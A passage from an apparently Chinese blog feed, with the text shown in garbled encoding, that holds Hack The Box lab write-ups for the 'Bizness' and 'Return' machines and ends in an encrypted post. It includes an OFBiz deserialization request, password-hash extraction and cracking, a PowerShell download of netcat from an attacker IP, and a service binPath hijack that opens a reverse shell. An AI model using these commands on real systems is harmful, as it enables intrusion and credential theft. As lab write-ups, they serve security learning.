<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /id</span><br><span class="line">webtools/control/xmlrpc;/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y HTTP/1.1</span><br><span class="line">Host: bizness.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=42ED2921E0C9B3F3BB49F2D2D2F4030A.jvm1; JSESSIONID=21613FA6F2D87CC9AF8B6AC6A4DF1FF7.jvm1; OFBiz.Visitor=10639</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Length: 4157</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">  &lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;</span><br><span class="line">  &lt;params&gt;</span><br><span class="line">    &lt;param&gt;</span><br><span class="line">      &lt;value&gt;</span><br><span class="line">        &lt;struct&gt;</span><br><span class="line">          &lt;member&gt;</span><br><span class="line">            &lt;name&gt;test&lt;/name&gt;</span><br><span class="line">            &lt;value&gt;</span><br><span class="line">              &lt;serializable xmlns=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;ç”Ÿæˆçš„paylpad&lt;/serializable&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">          &lt;/member&gt;</span><br><span class="line">        &lt;/struct&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/param&gt;</span><br><span class="line">  &lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸæ‹¿åˆ°ç¬¬ä¸€ä¸ªshell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405222320.png" ></p>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p><strong>æ¶‰åŠçš„çŸ¥è¯†ç‚¹æ²¡è§è¿‡ï¼Œè®°å½•ä¸€ä¸‹</strong></p>
<p>é€šè¿‡æœç´¢ï¼Œæ‰¾åˆ°&#x2F;opt&#x2F;ofbiz&#x2F;runtime&#x2F;data&#x2F;derby&#x2F;ofbiz&#x2F;seg0ç›®å½•ä¸‹æœ‰å¾ˆå¤š.datæ–‡ä»¶ï¼Œ<strong>derbyæ˜¯ä¸ªå°å‹æ•°æ®åº“</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat * | grep -arin -o -E &#x27;(\w+\W+)&#123;0,5&#125;password(\W+\w+)&#123;0,5&#125;&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>(\w+\W+)&#123;0,5&#125;</code>ï¼šè¿™æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨äºåŒ¹é…æœ€å¤šäº”ä¸ªå­—æ¯&#x2F;æ•°å­—å’Œéå­—æ¯&#x2F;æ•°å­—å­—ç¬¦çš„åºåˆ—ã€‚<code>\w+</code> åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªå­—æ¯&#x2F;æ•°å­—å­—ç¬¦ï¼Œ<code>\W+</code> åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªéå­—æ¯&#x2F;æ•°å­—å­—ç¬¦ï¼Œ<code>&#123;0,5&#125;</code> è¡¨ç¤ºè¯¥åºåˆ—æœ€å¤šé‡å¤åŒ¹é… 0 åˆ° 5 æ¬¡ã€‚</li>
<li><code>password</code>ï¼šè¿™æ˜¯æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„ä¸€ä¸ªå…·ä½“è¯æ±‡ï¼Œè¡¨ç¤ºè¦åŒ¹é…çš„å¯†ç ã€‚</li>
</ul>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-06%2000.02.23.png" ></p>
<p>æ‰¾åˆ°ä¸€ä¸²ï¼ŒPassword&#x3D;â€$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2Iâ€ ï¼Œç„¶åç”¨cyberchefå¯¹ååŠæ®µè¿›è¡Œå¤„ç†ï¼Œè§£å¯†æˆ16è¿›åˆ¶çš„å­—ç¬¦ä¸²</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406000552.png" ></p>
<p>æŠŠ_æ¢æˆ&#x2F;ï¼ŒæŠŠ-æ¢æˆ+ï¼Œå†base64è§£ç ï¼Œæœ€åè½¬åŒ–åˆ°åå…­è¿›åˆ¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashid -emj b8fd3f41a541a435857a8f3e751cc3a91c174362</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨hashidè¯†åˆ«ä¸€ä¸‹åŠ å¯†ç±»å‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406001536.png" ></p>
<p>çŒœæµ‹æ˜¯120æ¨¡å¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 120 &quot;b8fd3f41a541a435857a8f3e751cc3a91c174362:d&quot; Desktop/rockyou.txt --show</span><br></pre></td></tr></table></figure>

<p>çˆ†å‡ºæ¥çš„å¯†ç æ˜¯monkeybizness</p>
<p>ç„¶åç›´æ¥su - rootç™»å½•ï¼Œæƒé™å°±åˆ°rootäº†</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406002249.png" ></p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>è¿™ä¸ªé¶æœºæœ€åæå–æ‹¿å¯†ç çš„æ€è·¯ä¹‹å‰æ²¡è§è¿‡ï¼Œå­¦ä¹ äº†ï¼Œç„¶åapacheé‚£ä¸ªååºåˆ—åŒ–æ¼æ´å®è·µpocçš„è¿‡ç¨‹å¾ˆæœ‰è¶£ï¼Œhtbçš„é¶æœºè´¨é‡çœŸçš„å¯ä»¥ã€‚</p>
<p>æ¶‰åŠçŸ¥è¯†ç‚¹ï¼špocåˆ©ç”¨ï¼Œsha1åŠ ç›çˆ†ç ´ï¼Œä¿¡æ¯æœé›†ï¼ˆæ•æ„Ÿæ•°æ®åº“æ³„éœ²ï¼‰ï¼Œgrepæ­£åˆ™æå–ã€‚</p>
<h4 id="ä¸»è¦å‚è€ƒæ–‡ç« "><a href="#ä¸»è¦å‚è€ƒæ–‡ç« " class="headerlink" title="ä¸»è¦å‚è€ƒæ–‡ç« "></a>ä¸»è¦å‚è€ƒæ–‡ç« </h4><p><a class="link"   href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/gsh23/p/18087933" >https://www.cnblogs.com/gsh23/p/18087933<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>å¤ç›˜</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb returnå¤ç›˜</title>
    <url>/2024/04/09/htb-return%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>è¿™ä¸ªé¶æœºæ¯”è¾ƒç®€å•ï¼Œå°±è¾¹åšè¾¹è®°å½•äº†ğŸ“</p>
<h4 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h4><p>å®˜æ–¹wp</p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/440073688" >https://zhuanlan.zhihu.com/p/440073688<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/Purpose_7/article/details/128562358" >https://blog.csdn.net/Purpose_7/article/details/128562358<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h4><p>åœ°å€ï¼š<a class="link"   href="https://app.hackthebox.com/machines/Return" >https://app.hackthebox.com/machines/Return<i class="fas fa-external-link-alt"></i></a></p>
<p>éš¾åº¦ï¼šæˆ‘è§‰å¾—æ¯”easyè¿˜easy</p>
<p>ipï¼š10.10.11.108</p>
<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204704.png"   style="zoom:50%;" >

<p>æ‰«åˆ°å¾ˆå¤šç«¯å£ï¼Œå…ˆçœ‹çœ‹80ç«¯å£ï¼Œæœ‰ä¸ªsetting.phpï¼Œèµ·å§‹é•¿è¿™æ ·</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204749.png" ></p>
<p>åƒæ˜¯åœ¨é…ç½®ä¸€ä¸ªæœåŠ¡ï¼Œéœ€è¦å¡«addressï¼Œ389å¯¹äºldapæœåŠ¡</p>
<p>æ€è·¯æ˜¯æŠŠåœ°å€æ”¹æˆæœ¬åœ°ipï¼Œæœ¬åœ°å¼€å¯ç›‘å¬389ç«¯å£ï¼Œç‚¹å‡»updateï¼Œæ”¶åˆ°ä¸€ä¸²å¯†ç </p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204957.png" ></p>
<p>ç”¨æ¥ç™»å½•svc-printerè´¦æˆ·ï¼Œæ²¡æƒ³åˆ°ç¬¬ä¸€ä¸ªflagæ‹¿çš„è¿™ä¹ˆè½»æ¾</p>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>çœ‹ä¸€ä¸‹svc-printerè´¦æˆ·è¯¦æƒ…</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2021.03.47.png" ></p>
<p>ä»–æœ‰Server Operatoræƒé™ï¼Œâ€œ<strong>Members of this group can start&#x2F;stop system services</strong>â€</p>
<p>é‚£æ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯ä¸Šä¼ ä¸€ä¸ªnc.exeï¼Œåœæ­¢æŸä¸ªæœåŠ¡ï¼Œä¿®æ”¹æŸä¸ªæœåŠ¡çš„è·¯å¾„ï¼Œå†å¯åŠ¨æœåŠ¡ï¼Œå°±ä¼šåå¼¹shell</p>
<p>è¿™é‡Œé€‰çš„æœåŠ¡æ˜¯Windowsè‡ªå¸¦çš„å·å½±å¤åˆ¶æœåŠ¡<code>vss</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.16.3/nc64.exe&#x27;,&#x27;C:\Users\svc-printer\desktop\nc.exe&#x27;)&quot;</span><br><span class="line"># ä¸‹è½½ä¸€ä¸ªnc.exe</span><br><span class="line">sc.exe stop vss # åœæ­¢vss</span><br><span class="line">sc.exe config vss binPath=&quot;C:\Users\svc-printer\desktop\nc.exe -e cmd.exe 10.10.16.3 8888&quot; # ä¿®æ”¹æœåŠ¡è·¯å¾„</span><br><span class="line">sc.exe start vss # å¼€å¯æœåŠ¡</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409210956.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409211018.png" ></p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>ç›®å‰é‡åˆ°æœ€ç®€å•çš„windowsé¶æœºï¼Œè™½ç„¶å¼€äº†å¾ˆå¤šç«¯å£ä½†æ˜¯æ²¡ä»€ä¹ˆç”¨ï¼Œå­¦ä¹ åˆ°Server Operatoræƒé™ç›¸å…³å†…å®¹ï¼Œä¸é”™</p>
]]></content>
      <tags>
        <tag>å¤ç›˜</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-permXå¤ç›˜</title>
    <url>/2024/07/10/htb-permX%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fa3894042594a3ebe558c2ad9a7c5517219b41d985abec3337968f8e2cbdb1c4">30d1cda685abf5401ce8be36443054c12d93976f3423e4fc2eaa996141e194c2c52a8e84a8dc712b774910901007a365eb4004cf609da05288b803cdfdc92a92d2430b3d430b28dfe6f17ba6ea9a877f4bc3eb176aed7a490b11ec95b70dbd7db96a21b2212264a48ce4373ed629dd6b9cb0aac74a661389af0cb49589b9a4e1d4578f403540fe11e13bb8bc2d6442a57395b3b0d3fd234be6724ff1706e6eb1daf00e5cc6e0e0a2e51b044d286b9db4f9ede6b474136fe01aa1c0065ea57510635317e0417006c5308c687b7bc3a16242202efda3e3d72943ffe0d37ba9ba9dad0922d4ad1494c0de51ea5aa0bcce739dc50919227a06454506c3d1af9a5cf3389fd5eb625418044b7a9a47128ea61849cb24a75c2bbe207dcf8e2d1809ca6394ca6c338f2246f0095fff8bc7e378c60e6cf641bed69149f23c7d7268e1ed513c9f77593dde36464bda24ae9d4fbf11347ab3156171f1416a6d9e62adb5f9469bd1dfe512d0b6cb587436efa98d50c52a8794a6452a3471cb8a05421f5b595616cf946fca726ca41ebee269b8622bfcfb015c638a66aa86d6802704b703fb522a49659ebc7096b2ea5b1abc5c96b6b104c3685420dacfa6bdc75bc0304b8b0a977c63099d9f09e162cbee36b244379d3f388290195f75a8fd738b9bb5193707173f79f8177458ba1de82c96b7fe9008d858203d4d8af2d9ba2de01260961d27f9af05e633ef92bf47a4837c9676a5a98651fa052f023029b588698632d15a491e0dffa647820c1c5eb95988c4181fc1fec69a6f6f99a843dc2d886084124de92e272436d64895f43dce0b6953365812a58cf223395285e89f31e25005ac3636855f0ddb96a51ad521b660ecfe835cdf697961a3abde611544fca90ff9cf79c8e7d7dc6d7a10a2ce203e1aaad26b132d35452474df93d1fdfa05ef7182ff955b4c58655478bc1e1bc2264b5cae7c7dcbc94b7f09742d4aec8f79acdb3cd5d92511cb0a65f6bec9e5134ca8e9037b8a1b2025f9b2dd6d53ecf8e53c112a6e7cd91172cd52ecf7cdc6c6ae3bdc4a8252ff3936d5ad47d9bafd45d935ecb509e6efd5142b4bb331f13509ca11858e00c49e88682e757305b432e806fde54400c3d74fa5c631d267cc61ef355a063e20e1bd33e5cac5582c5ce9274f73e5ee11e056a6e64c95c901f1452564a0bcc164e7bc363b8a82504ffdbd43166ccce4cd03ec97072dc821b6c4bad3cbd6f667a17047a0ae7f61628197adfc0022d27c353255422c92b64af560e29e16129a474825a5c0ecd3f792cfd97b8cf10cc9df12e9af301edfa2dd8a73764dd91a258b23fe2651d6e3f731c2bdf059712e0d66b21eb12dacc4a802e6555c346b9139cd765ec94cf0557ae5a9dd4f4629565f5342a694f31588fcce29aebccdf14a7450f9250dd8174261c3efcfa0b8d01536dfa7f583d9d450ad49cb74eac990c7b0bb1e0fb609289cd8003757619232a6d12a3efeb6329f584d0fc49a46f1f6dffeae8c952053c6ceff119ab6551b6172a092b7c60a2d2d8d44e984f5f8ee60943192449c3fb66b754e682359f69b3206e4341b9d96a24ecd1be5226c8db8877e84bcf27c5bd1c80f195b03008f8cd7ec54776f94a044b8a3f1cb4d9a30ebcfb2ddd7d1f8ca4c2b08726b4da461ccb4ee62be857ce913e6ea22966c7f4bf4860da0f865db859ba749fd83a6b590f4eceaf62be624f8bf72805cbc40a601b1db56ef77d8997d9c1ed4ec6c6eb0f3b49acf171ab1f80254a4671c0aa826e560f490a2c539396e73e923cba09927924c688ab989efb0f6e097df9e4cd5d546b8c22ad50515b885ada25c273e7ecb5fbf6ef1444090dd8e1ebe83779e970aa21cc7423e3e2236991d7286367a14681cd167232e0d8b3b583daa5cc587dcaabcc3d0fcb0ddad48ece21da48a134f69139946c6839650b1840d8592031710bc70875d9e29c70da145980173adcffada1c4e00e86696560a8834c8ab1ae15c6bee1bfeb1733874fb34ab4aced9e978551ba8b699d26056afa47736ee67d11c07b86500fb403b20a17c036e27619c18da58b6bec8faaecf7e1b0adc9763719b30cfaf1ea41fd29c182cc0845560291d5a4922479f6e27d6036c8b412402f757354dcbebbbc80f263ef9266cd8189e5511594763c51dff7f2aa7b60d82aeed2703a5aaeb391a2935eeb398cce62e19cf3100d61d361821864255322b2814d797307f5e9d95cfe59a31b4212ed36a41fdd0b12e637b997f47dc5ffb806f61b6bee86acd157fc3946b63b63e1b90894ed38480a48c7ce9121ac6b3b7d4e5ecbf1b0b2411a1dc085cd4747e4de1c4e05861f229f1312aa4b00e177575ace465839d0290c666946b66cc3ebf2b0108fae3fc29511e5383588b29cf23d647492cd62192bba29f02d0796c200b02fd0b24f4fd0a599fd2ccc6a0e1d90ed18d7225187f22a2636221705c2621598d631740e276d973eec28b05eb3b81e07145570d724ac6794df105d03d0d4388807f753c719b6313bb2714e9377710a635f4a7a56857f2202f8c00133d9d1bb0cefd02d65f0f8ca32a2c01099cb7b24406c142706983dda7697a1fa4d0a734c6703aa752ed35acdc1335d1e9fd4d5e51b8bfe34852840117c8ba1c592ac50d8bd7a69bfbda84f96412e35c0bed6553b6a7887e2b3700b469315c056d7f2624a907f932e299061bd994bf2b57e2c16a59f670750249708745e5ab0ee415197c3f2e16681c710b54fde48b159772a70c23ac34a7b51eef4762850985c7d26e4eaa9ae16af2f3d945b9bfa98f1c39b9dbe9c54b4a070ae449546f9fac31416a50df810c380ef54b6051360b6361a0bdb09eb3a784b02895d857c6ce4464f94775e628a65a49c8b8d8f03df4932171159c3f3fc1d72ee6206f3c59b1f09e632f07d4c1a48644356ca87fcfea87dbb121f8f608f97c438930e37508dd35286c20063c0263d192c79e4126987deba1236e123648c3d58142a05134057ad5424f8296c96217e88a482c1beaa16eacf45ed7bb0ba9298e7e01d7ad0dffc49c83928c8817e83b947d75a5d813957432274572186ef3dfc96407c81ab8b04ce97e5a522e7dd2ca40f7e7ea901df9ce64b9ee915bfc9c679728fd57fcb5c0022b72ed089411243342a438601e7ecce996adf84fb020f05dbd3157f1c3a4c26187b449c64fd8d0703642b617635837252a7b65d199f69bb6714ea4d8b00daf25744d28897a4944c46f93349237011850102447bcef3b4326cd6f18ab1ec56ceaf4d8c5b294501a3f4497881082aa7f1d465df05ea7dd8186c52344d1ac2489967b6d9af2d7ffd57a8c560b4e9a8424e42ea719bab443a712d97121c20c3c40956b44f2f283e4cbca4d899493ebcb379cfdbdf8dac7c8054db8b12a82ec2ae189be0c63ff7cba812a266020658574d4ca413b06a44d5ff34d48aca7eb6e87b8609e5bc8efcd80a26165811526f78c037dc985731ccc97fd87a5533cafc1f287f7648d75054d78213da8d51e3af010c44b968744d1421d8fc69bd2b08f711a40c4d35398aaa574e2994cb4763622969802ab00f8a8d5203750dda9dd6b50d78a16b3607ec807743b4430b45116f1e669e4c52ca712ad0fa93e501b6d111936c0f4ffac10e0587455b9a9704d3c8fd5fd5d77f3a926fc3050c68cbd67dd8b8fb0f5568d7765224eac498d7c3dde051fc7fdc90556fd6d5d3674599c033e052521ee0f23c9ac9a1aa6ebbde34c896572ed27701401e98c71dba9e776bd16210cf470232755374267f9b098dc0f9d98fff70a10415c6fbac2c024c9e2e7fb08f1c5b11b13f495f4e14a174336d549c029dc042d2cd5946ffff5360d999868fa5c0be7b79681ff12864eee9dc21e875a82d0fd6c79bd8b368ac30213cdb8b293c34824e88b51d4d5290d6ad6e94a1d5c6abfe7a7c6393f7f28c99858925b5acb0ead47f3eb95d6de728507077919600c8e9740d751fb0d04e4da4b4083b17cf0889e29508d1e7c246a3b082cd0d02d10ee03e05532021ac23c2e728ab45e68b9bd983855f1bcfc316a5062a30593e1e35438a51befc471389b3879174a288f46414a070c1ae4d5ac02059cb09ff9820fbd713f9c564907ea1a626965cc98c54ec14238c714a22e1820f9285235158c3f2a47979473c8fead9ef93ff4af4cae0158ca240f320332478aa74a65cdc28dc964374b54ebb577f473ecd8f910438943e8c1b83bec6ca28d8d4d5b1d9d8e7decbc1c35f6787dec6eb4cfd4c079890c79b82572e618eed7dae4bdf75d563a7520134c8d6444272c552fee81e85c3eeeebb2b3f9ce76279b0a344c2d4fd5fc2b0afd7a894e8d1f8026fcf245a7429e7b2b28d7be6f3a1ebd3f49228edbd0726522b9608ae75390278e0fddda8c5b7d88cf6d701b663f9c91974774c90f2855cc3075a279280dc1bdb7291cdeefd26da13f52b8bb72920d764bc6cb8805e5fa47ac749c8c5fc37e9419d15d8c5bffeeef8b669e627ae77b4e76796ecf2c423b285095d3e829e554bd5bfb3a0108026d86fa7cf4fcee577128458e72243d27521dacbfce8080d26238460fe9ac927c9a2f274639d93afdad9c593cace76b0a00f3b75d9aad5352159309c54f6b2b3d81792518d2c6650cd4c0b2ff14fd689eceb0b7f514edc7f6b096e3db068cbbc7b4aae0e57f4ee38baec8312663bab914ed5be9bc0d9349fa6baeda308f5a73f2e3e25f6d07f974ac6356cfe90553386e58f78557c36a896b988ca8b34b77acf05a9dd2d9fc25be5889cb36ec923a3ad4beb95a8aee1e28b798849508099245184bd949300958dbebeb350b77f1d1d74b4067cbb1141841c6c563d35fc539908012ffe8b311c99b0d304874d39974b8b409c950b9a223f36a5c25afafb1d2e0da5cc8057ca55a0f759f231b6e30393b78f6a5d0793559ac1b8b30944ae1a549976255a9abdee1470bbb5de38e4292db3a6a55e7f0b891033dd2ecc089eef701ccb2fc71a1d689320b242c8416871729366ff6bf67b77f1ae8779e4f59e23a077d822f74029e72a44b4392518dbc62f06e34295ed63343f20d5bfc43ac6964245e286826bf54df1a0b1159f27519b61deca855200519a8506ad4373ec01c2908b3ff97ae1ec9f9b52aefc2d8fbf64a32f3b0cff5c0e227376e875b226402242a20d138afa833282c13297331ec1a2e6fb33e9eacc128cc98ddc9ad8541ffeec96a03c520a5fd1f65eff9e16f640b6de9d337ee6a10a0479db716c1b8883b0ebcc89a74522118c60c53eb7cba59aae37f5d7e4dbf8d93c05bc3061a8a6f393e7ea2fb6bead86fe42b0828a733aacd14c4e4d786e862b05c3dfdc2d5c89fda1f5c79bb4c71b585a0cba7e05e47d2d0ea9e6808ad2b2590338e20f585944a0d9de821fce157d8a9f7348503e32b2cbe5196a62a4645ae763a8b319396fda2d184c394a0ed16a9a931f594b744271463b45f687cc8acead015c4a06f40aec94471d6f01770f7b89490cc5e614be0a0d1b7e749b6d09d5c4dba9fa0889570a6a8977a8436666fb43ac870f007f0820434c41d2893ad12126305e2f5fd73efdf2f15152ff764232fd553153eb4eb552df742ceb1eb672b2845305655cea0e61ef0fed4b16d687310b1e39b47443e38978ffc9e2eba3dc71161d3213be2495dab3ff7cd83b1d1418d8783534626a6c9425cdc3272337583dbb8fd3bdb8a5a9608f0828a5030fa5cea566c398eeb973d8e604f9ae6d035473f26581cf6d3fc4f8c79ad7c57a8d6900ab0d3df4bd2975f0b1e348bbdf9906bdfbadadbafabac875be473a7d0cb8ec7adaa4c44d7268d3963fbdeae1894d76ec49f2c8a560049360e4219322bb0dd58fed4ecbbd2877b7e676f19997626b21fd9fde5b103fe346a4a9a4d2c82c9cd9c31d02bce47c8429a5c01c80d551b21053b30ebb9eef6de1b76d49878e16bcba8ce97a4fd896d7159780747dcb40443cd6a76da135a28716ba1af8ea62e179abfb18ec616c46a3cc2cdf3adc47f28727cb04b089a65e4d2be2c81a66f01dd9827c3b272d2c6925fa1200eb038302f04ad3eb970eb039fd5e5ef71a9b6125798ba9aa7c2ebeda9a12fc95e18056d4af83be27bdcd91f0f10ae4081f570ad6524bc27a0bb1478a27b1b5b211052771e28aee157dae26be94c591bf2ba39acfb20a80e4f74bf1a572ff2b1c3e433351d0e831c74649cd939a7e730ddf7b62eb3c987e766ae871890337fbc1c4fa38574162ccb2ea08b65a51b6f39831d34bd8b7a688b4ef3d02830b47df94cb3d0363267c1be38ed5de1e5aecef83f9bd107a44c4688d215a4ae5c2bf845988a7ef7b4bb074df0af2a31fecd969e1aad8f033e6b2a8733b5191a15f21821f5c1fc4325828984f653d78bee94a7c4d641ea0733d694ad899aa86af8d5abf1368682573ecbae863473d2bff545621d0ce7294956ff50801e5eab93343ed96c9f47b09e58b0c441c327adca7e788798e510507d5d10d83929477e759e08624e5843d5351971ce8e8427c7adc6adc6f6fa474fcbf05cb4db045367199c6ee2938ea533c2db4e569e4e2d9f7a66d082fde1f11d7c6bb9c6136a53658b3387c16d59d98a9efdaa00610e71e97c707ac4c4bfecd3a8d5e15bac8a0528dd8451cfc2b1fd2645ae3fd8f5c430d1317581a7717d2fcaf93cd67344ce8b8ff7e9dbc5b978cd166f381def83139ac7609d4a57b7f8c1cbf8077ce36f5d2b47e99f974f561cae75a0a5deacefd9f50e345c9ccb40680843adcc7c00e8db7846e424f8f7f95719a35a7c90dd71ccd2ab6f930dd7aff1b380c333ba28e2c6f63f8d46ae18948b91cf01e03860022b5233391242c228acce24be7205ccd5b26963a3760d9f55d7a61aba8c82fc3f67c57eeb628e3c7de0238b7111d7f55a855ab9e65a89c18a9706c45ba4b0201783dd61f132c757376241d0b114f74c6953ffce9eaa3577604b7d1969789757a0390bd96e963f5d58f2da02cc87078569f882efd849950f606f29baba02413311352f4a4ae21c38bdea74e99821912437418638f5389be70a328496d7f76a1aa1379db44861d3e8007f1812054fdc8c41426ab3947a38e28f39528983d6959a3a8497ada12d2ec07d4a36fb5d4d47297c3c06e2d4ea1efa6ca8618bd9bc95cc45e1140cde5c8203c015799fb942953d99cd85cbb44e52b5c586dc32ea46a224ed0aa65cb61f699972b01ee3ec4efee4092439110c1dd6f36f20363183fcc385821a809c32df4958998bc5e0d9e37bbb02ba6a9ffcd69257eebad84debf99ffbfea56d32f50baf33be6abee3ebc46f68bfcf80b2a11d8685ca331117e994a707effc7c7d4ff187b13ea4d677648a7963a5e4018316fe8d928b70cf3dc822960aa47fac64c54c16436c80cb0f70f0931a466feb3bdeb11dad8ef269aa7b772d682c73298fa3660d261ceee68523f482c1aa9674381d3d886ca123ff4d2f8bd40bd79afcec0c548782796351f2b3353962a85ca2a8d43fd273ab62350153df33535115c66bac798152d9088cc405e6eb856b790ddacf268443795f815341c98d7071314610e15db10b6d88d29b90f1af34f065f4e0440ad4b3a19f1a6ec39ec5c08a1b78d53aee2dadeef9bf31b46b1f2c7f6150ca21166cdebc6842403b94a4e194c858bbd8c8bf9e48866b2b2c7fa9aab9d9e295602616469915831117ca8442039f2d34a110096dabbd58cfabaf2b3a807d3b6c23a327e6ae5d05d6a08d407897008fa854aaf8e4e9e8dfa4383d8634fb4f32bd2ee756b01811d93fe4d3e56f7e0959ad8e42a56681c5ae7bb2a3a21fb2e864c77b111d0f0f49b407e315394147ac3ed9c5c4e0f3ebbf5c8ab047bea948ff5779b885b33c82c31f979776f148a4cba00ba644bcbd8267eb637db570f6aa32e12dac0a5946f9b181ee8929b96d4d539cc12065b4855c5c1e21ab09155e739aa768086f76a597445d21284872a08a414d554c0ab2a5d83ac16a0dc9e39f2c8ca1896ed0bab578c9458926a90f8275876a937289f3024261689bf3345f1dad35fe91ecb3cf0a7932c5b7e7aad783b077f189d431555fabcc3c2008281ae7826e002042b6126061d7f824654a7af4ae4b001d0cc7b3334c4f271a831abbe49e7eced942b945e8a5f8634ea28f0d4e439aa81f43f2463f8ed8b3458ddacf5442844ebc2bf03fbc91f1fbfcefb883709218c2bd46db8f6dd04a2c9f259caabeed79256c3e1e9750316b1b1c1cf32fa29df0727e84bc08c3a4903f66732aa62fb963e3e6ecdd3150c97212312d2227eb44636644d2c5f72ae48d3f7d6a9ec0f20e74d1f2645e1dc3afbc6f2b149e2a18b08dd819c5f2db0aed2db9fe3dc122e8e7a8b351d661660e79f8e592f656ce31da528887e4cee257057036455338dc20525dfd94405c547d1868e2e2cf8ec7e2c5206479560ffbabb5226ca27a7ef7f4df4fbafc514ff4215df39f59e79af7ff083eeda28b7a082912ee032ce1de4e474c01cb0209af4c03e5bf5d3accd962a1121ba2b0f85742de740ac9488786864b1f3345b12b3d998d496443b30c01f8f0456fa463b34ff151ff8e445dcba575eeb832595238208bfd80c8c67368f9fb44d8380731a2467d659ab99dc4d2a3cbd08a5963ab4f341eb010b76d4f788a136c7a736a18087be062423538e5bfabd1ce92984fdb9631858489609bebfb64eb21267eeb6f799312d62977790b2eb4fbeabe85e63664b05cfca0962918ecfa18672bcee4d4c4b65f20001264a6c17c35b53b8c3573a4b269010c2e5bee09be961e02ade3845f034cf26f3d2349f798e980a3d047e41d8ec53723d8f71ec243237ba0a78e927c1a4c428880936ad9cfb96b46df4a1b8197b7277d4d05bf660224520fa68e11fbb737ef9118cadec06fae282ab652a0117695d5